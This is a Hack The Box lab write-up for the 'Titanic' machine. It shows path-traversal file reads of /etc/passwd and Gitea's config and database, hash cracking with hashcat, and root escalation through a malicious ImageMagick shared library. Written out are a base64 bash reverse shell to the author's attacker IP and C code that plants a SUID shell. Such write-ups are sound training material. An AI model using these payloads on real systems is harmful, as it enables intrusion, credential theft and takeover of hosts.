---
{"dg-publish":true,"permalink":"/ct-fs/htb/titanic/","dgShowFileTree":true,"dg-note-properties":{}}
---

# By 0xCapra_Daemon aka Will Keller
#linux #gitea #imagemagick #scripting #C #hashcat #LFI 

## Recon
![Pasted image 20260813123127.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813123127.png)

### Nmap:
```zsh
Enter your target IP address or URL here: 10.129.231.221
------------------------------------------------------------
Scanning target 10.129.231.221
Time started: 2026-08-13 15:24:40.146793
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port scan completed in 0:00:33.352374
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.231.221 10.129.231.221
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80 -sV -sC -T4 -Pn -oA 10.129.231.221 10.129.231.221
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 15:26 -0400
Nmap scan report for 10.129.231.221
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
-----------------------------------------------------------
```
Initial portscanning shows that we are being filtered when scanning. Let's attempt a stealthier scan.

```zsh
└─$ sudo nmap -p 22,80 -sC -sV -sS -oA ./nmap_stealth 10.129.231.221
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 15:28 -0400
Nmap scan report for 10.129.231.221
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 second
```
Stealth scan output shows ssh on port 22 and a webserver on port 80 called `titanic.htb`. Adding to `/etc/hosts`.


### Port 80
#### Tech Stack
```html
* Host titanic.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.231.221
*   Trying 10.129.231.221:80...
* Established connection to titanic.htb (10.129.231.221 port 80) from 10.10.14.192 port 40798 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: titanic.htb
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Thu, 13 Aug 2026 19:32:03 GMT
< Server: Werkzeug/3.0.3 Python/3.10.12
< Content-Type: text/html; charset=utf-8
< Content-Length: 7399
< Vary: Accept-Encoding
```

#### Browser
![Pasted image 20260813123328.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813123328.png)
Visiting it in the browser we see that it appears to be a booking site for a trip on the titanic...clearly AI slop...

![Pasted image 20260813123542.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813123542.png)
Clicking "Book Your Trip" we see that a popout opens asking for booking details. Let's submit fake data and catch the request in `caido`

![Pasted image 20260813123848.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813123848.png)
Submitting the data sends POST request to `/book` which triggers a 302 FOUND redirect for a link to download the booking as a json file.

#### Subdirectory enumeration
```zsh
└─$ gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,css,js,txt,png,jpg,jpeg -t 12 | tee ./gobuster_80
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://titanic.htb
[+] Method:                  GET
[+] Threads:                 12
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              css,js,txt,png,jpg,jpeg,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
book                 (Status: 405) [Size: 153]
download             (Status: 400) [Size: 41]
server-status        (Status: 403) [Size: 276]
===============================================================
Finished
```
Nothing too interesting on the surface for subdirectory enumeration

#### Subdomain Enumeration
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/titanic/scanning]
└─$ ffuf -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.titanic.htb" -u http://titanic.htb -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

[Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 110ms]
| URL | http://titanic.htb
    * FUZZ: dev


```
We successfully enumerate the `dev` subdomain for `titantic.htb`. Adding to `/etc/hosts`.

![Pasted image 20260813125532.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813125532.png)
![Pasted image 20260813125606.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813125606.png)
Visiting `dev` in the browser we are met with a Gitea instance running on version `1.22.1`.

![Pasted image 20260813125844.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813125844.png)
Clicking "Explore" we see repo entries for `docker` and for something called `flask-app`. When we click through we see that it's the Titanic booking app we are targeting. Let's snoop on the source files for secrets.

![Pasted image 20260813130151.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813130151.png)
![Pasted image 20260813130217.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813130217.png)![Pasted image 20260813130233.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813130233.png)
Inside the "Tickets" section we see two entries. One for Jack Dawson and one for Rose DeWitt Bukater. These might be useful later. 

![Pasted image 20260813132757.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813132757.png)
Enumerating the `docker-config` section under `mysql` we do see hardcoded creds for the user `sql_svc` in the docker compose file.

![Pasted image 20260813133221.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813133221.png)
Further enumerating the `ticket` parameter we try to exploit LFI and get a download with our input as the file name.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/titanic/files]
└─$ ls
total 16K
4.0K drwxrwxr-x 2 kali kali 4.0K Aug 13 16:33 .
4.0K drwxrwxr-x 6 kali kali 4.0K Aug 13 15:23 ..
4.0K -rw-rw-r-- 1 kali kali  545 Aug 13 15:44 book.txt
4.0K -rw-rw-r-- 1 kali kali 2.0K Aug 13 16:33 _.._.._.._.._.._.._.._etc_passwd

┌──(kali㉿kali)-[~/CTF/HTB/titanic/files]
└─$ cat _.._.._.._.._.._.._.._etc_passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
We successfully read out the contents of `/etc/passwd` on the server.

![Pasted image 20260813135524.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813135524.png)
Reading some hints on HTB we know we are supposed to be targeting the `app.ini` file to leak creds to us. However manually searching is proving difficult.

![Pasted image 20260813135618.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813135618.png)![Pasted image 20260813135646.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813135646.png)
Looking at the docker compose file for `gitea` we see that most of it's data lives in `/home/developer/gitea/data`. When we visit that in the browser, it returns a 500 server error. We can use this to fuzz valid endpoints.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/titanic/files]
└─$ ffuf -v -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 'http://titanic.htb/download?ticket=/home/developer/gitea/data/FUZZ' -mc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/download?ticket=/home/developer/gitea/data/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 500
________________________________________________

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 105ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/.
    * FUZZ: .

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 194ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/git
    * FUZZ: git

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 141ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/ssh
    * FUZZ: ssh

[WARN] Caught keyboard interrupt (Ctrl-C)


                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/titanic/files]
└─$ ffuf -v -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u 'http://titanic.htb/download?ticket=/home/developer/gitea/data/git/FUZZ' -mc 500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/download?ticket=/home/developer/gitea/data/git/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 500
________________________________________________

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 122ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/git/.
    * FUZZ: .

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 195ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/git/.ssh
    * FUZZ: .ssh

[Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 167ms]
| URL | http://titanic.htb/download?ticket=/home/developer/gitea/data/git/repositories
    * FUZZ: repositories

:: Progress: [43007/43007] :: Job [1/1] :: 264 req/sec :: Duration: [0:02:46] :: Errors: 0 ::
```
We successfully fuzz `git` and `ssh` routes as well as `.ssh` and `repositories` within the `git` subdirectory.

## Initial Access

### Credential Leak

![Pasted image 20260813142414.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813142414.png)
Finally find our app.ini file in `/home/developer/gitea/data/gitea/conf/app.ini`


>[!info]
![Pasted image 20260813142610.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813142610.png)
As you can see, the `gitea` docs for docker images show that customization files ar stored in `/data/gitea/`. 


```zsh
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable
```
From the `app.ini` file we see there's a sqlite db stored on the system.

![Pasted image 20260813143139.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813143139.png)
![Pasted image 20260813143411.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813143411.png)
We input it in our LFI vuln endpoint and browse it on our machine in DB browser. Where we find password hashes, formats, and salts in the `user` table for `administrator` aka `root@titanic.htb` and for `developer`. Let's try cracking.

```zsh
┌──(python3env)─(kali㉿kali)-[~/…/HTB/titanic/files/giteatohashcat]
└─$ python3 giteaToHashcat.py ../gitea.db 
[+] Extracting password hashes...
[+] Extraction complete. Output:
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
hacker:sha256:50000:8uRuPYCaLoJ8Dt0vgRekhg==:BCw08XPvY2Z/7KMkcxxT5qtmGSsaFEzrc8u97lJqM4Ua5loWNbtTy/58W+Lfh4DaaXE=
```
We find a [tool](https://github.com/BhattJayD/giteatohashcat) that parses gitea databases and converts the password hashes to `hashcat` format for us.

```zsh
Host memory allocated for this attack: 513 MB (1483 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqc...lM+1Y=
Time.Started.....: Thu Aug 13 17:58:06 2026 (5 secs)
Time.Estimated...: Thu Aug 13 17:58:11 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     1367 H/s (11.37ms) @ Accel:196 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 6272/14344385 (0.04%)
Rejected.........: 0/6272 (0.00%)
Restore.Point....: 5488/14344385 (0.04%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:49000-49999
Candidate.Engine.: Device Generator
Candidates.#01...: shannen -> crazy8
Hardware.Mon.#01.: Util: 96%

Started: Thu Aug 13 17:58:05 202


└─$ ssh developer@titanic.htb
The authenticity of host 'titanic.htb (10.129.231.221)' can't be established.
ED25519 key fingerprint is: SHA256:Ku8uHj9CN/ZIoay7zsSmUDopgYkPmN7ugINXU0b2GEQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'titanic.htb' (ED25519) to the list of known hosts.
developer@titanic.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Aug 13 09:59:09 PM UTC 2026

  System load:           0.03
  Usage of /:            83.8% of 6.79GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             227
  Users logged in:       0
  IPv4 address for eth0: 10.129.231.221
  IPv6 address for eth0: dead:beef::a0de:adff:fe65:333e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

developer@titanic:~$
```
hashcat successfully cracks the hash for user `developer` and ssh to the server successfully.


## Privilege Escalation
### ImageMagick
```zsh
developer@titanic:~$ ls /opt/scripts
total 12K
4.0K drwxr-xr-x 2 root root 4.0K Feb  7  2025 .
4.0K drwxr-xr-x 5 root root 4.0K Feb  7  2025 ..
4.0K -rwxr-xr-x 1 root root  167 Feb  3  2025 identify_images.sh
developer@titanic:~$ cat /opt/scripts/identify_images.sh 
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log


Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```
Enumerating `/opt` we see a `scripts` folder that holds `identify_images.sh` owned by `root`. This may very well be a cron job that `root` is running on our system. Additionally we note that the script is using `ImageMagick version 7.1.1-35` which is vulnerable to a [shared library vulnerability](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8).

>[!info]
>![Pasted image 20260813152039.png](/img/user/CTFs/HTB/Images/Titanic%20Images/Pasted%20image%2020260813152039.png)
>Because of the way this version of `ImageMagick` handles certain variables, it's possible to inject a malicious library file in the working directory from where this script is called.

```zsh
developer@titanic:/tmp$ ls /opt/app/static/assets/images
total 1.3M
4.0K drwxrwx--- 2 root developer 4.0K Feb  3  2025 .
4.0K drwxr-x--- 3 root developer 4.0K Feb  7  2025 ..
288K -rw-r----- 1 root developer 286K Feb  3  2025 entertainment.jpg
276K -rw-r----- 1 root developer 275K Feb  3  2025 exquisite-dining.jpg
208K -rw-r----- 1 root developer 205K Feb  3  2025 favicon.ico
228K -rw-r----- 1 root developer 228K Feb  3  2025 home.jpg
276K -rw-r----- 1 root developer 275K Feb  3  2025 luxury-cabins.jpg
4.0K -rw-r----- 1 root developer  442 Aug 13 22:15 metadata.log
```
In our case, the folder the script calls from is `/opt/app/static/assets/images` which our user has write access to. Let's try to inject a malicious library file in this directory calling a reverse shell back to our attacker machine via this [POC](https://github.com/Dxsk/CVE-2024-41817-poc) I found online. It takes any command we give it and compiles it into a `libxcb.so` which is commonly used by `ImageMagick`.

```zsh
┌──(python3env)─(kali㉿kali)-[~/…/titanic/exploit/privesc/CVE-2024-41817-poc]
└─$ python3 exploit.py -c "echo 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTkyLzg4ODggPCYxJw==' | base64 -d | bash" -B
[!] Mode build only
[!] Building payload
[!] Payload created in "/home/kali/CTF/HTB/titanic/exploit/privesc/CVE-2024-41817-poc/out/delegates.xml"
[*] Compiling shared library with gcc...
[+] Shared library successfully compiled: out/libxcb.so.1
[+] Shared library ready to use: out/libxcb.so

developer@titanic:/opt/app/static/assets/images$ ls
total 1.3M
4.0K drwxrwx--- 2 root      developer 4.0K Aug 13 22:25 .
4.0K drwxr-x--- 3 root      developer 4.0K Feb  7  2025 ..
288K -rw-r----- 1 root      developer 286K Feb  3  2025 entertainment.jpg
276K -rw-r----- 1 root      developer 275K Feb  3  2025 exquisite-dining.jpg
208K -rw-r----- 1 root      developer 205K Feb  3  2025 favicon.ico
228K -rw-r----- 1 root      developer 228K Feb  3  2025 home.jpg
 16K -rw-rw-r-- 1 developer developer  16K Aug 13 22:24 libxcb.so
276K -rw-r----- 1 root      developer 275K Feb  3  2025 luxury-cabins.jpg
4.0K -rw-r----- 1 root      developer  442 Aug 13 22:25 metadata.log
```
We successfully create our malicious library file and load it into the directory that root calls the script from. That payload isn't working.

```zsh
└─$ python3 ./exploit.py -c 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' -B
[!] Mode build only
[!] Building payload
[!] Payload created in "/home/kali/CTF/HTB/titanic/exploit/privesc/CVE-2024-41817-poc/out/delegates.xml"
[*] Compiling shared library with gcc...
[+] Shared library successfully compiled: out/libxcb.so.1
[+] Shared library ready to use: out/libxcb.so
```
So we decide to use the old SUID trick on `/bin/bash` for our new payload and upload it to `/opt/app/static/assets/images`. Still no dice with this POC. 

```zsh
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){
 system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
 exit(0);
}
EOF

developer@titanic:/opt/app/static/assets/images$ ls /tmp
total 204K
4.0K drwxrwxrwt 14 root      root      4.0K Aug 13 22:39 .
4.0K drwxr-xr-x 19 root      root      4.0K Feb  7  2025 ..
4.0K -rw-rw-r--  1 developer developer   73 Aug 13 22:13 delegates.xml
4.0K drwxrwxrwt  2 root      root      4.0K Aug 13 19:20 .font-unix
4.0K drwxrwxrwt  2 root      root      4.0K Aug 13 19:20 .ICE-unix
 16K -rw-rw-r--  1 developer developer  16K Aug 13 22:13 libxcb.so
124K -rwsr-xr-x  1 root      root      123K Aug 13 22:39 sh
4.0K drwx------  3 root      root      4.0K Aug 13 19:21 snap-private-tmp
4.0K -rw-------  1 developer developer  322 Aug 13 22:13 ssh_client_ip_developer
4.0K drwx------  3 root      root      4.0K Aug 13 19:21 systemd-private-1817bd938e74427e981ea8275c50634f-apache2.service-wHAqJN
4.0K drwx------  3 root      root      4.0K Aug 13 19:21 systemd-private-1817bd938e74427e981ea8275c50634f-ModemManager.service-c2gJRf
4.0K drwx------  3 root      root      4.0K Aug 13 19:20 systemd-private-1817bd938e74427e981ea8275c50634f-systemd-logind.service-pTwP0O
4.0K drwx------  3 root      root      4.0K Aug 13 19:20 systemd-private-1817bd938e74427e981ea8275c50634f-systemd-resolved.service-g3v2NX
4.0K drwx------  3 root      root      4.0K Aug 13 19:20 systemd-private-1817bd938e74427e981ea8275c50634f-systemd-timesyncd.service-bUcVhE
4.0K drwxrwxrwt  2 root      root      4.0K Aug 13 19:20 .Test-unix
4.0K drwx------  2 root      root      4.0K Aug 13 19:21 vmware-root_622-2689275054
4.0K drwxrwxrwt  2 root      root      4.0K Aug 13 19:20 .X11-unix
4.0K drwxrwxrwt  2 root      root      4.0K Aug 1
```
Finally broke down and used a guide which suggested a small script via gcc on the server itself and it works. Not sure how it's different than the POC, but here we are.

```zsh
developer@titanic:/opt/app/static/assets/images$ 
developer@titanic:/opt/app/static/assets/images$ /tmp/sh -p
# id
uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)

```
Successfully escalate to `root`. pwned.


## Final Thoughts
>[!Takeaways]
>- Read up on the docs *carefully* when enumerating a specific web app/service to exploit
>- don't forget low hanging fruit like a simple local file inclusion vulnerability in get paramters (i.e. ticket=/etc/passwd)
>- If your POC isn't working, try a simpler script and **make it executable**
>- Keep basic script templates on-hand to make it easier.
>- Be sure to note if the app you're attacking is installed directly on the system or is in a container like docker. This will change file locations and app behaviors.
>- Learn to do basic scripting in C

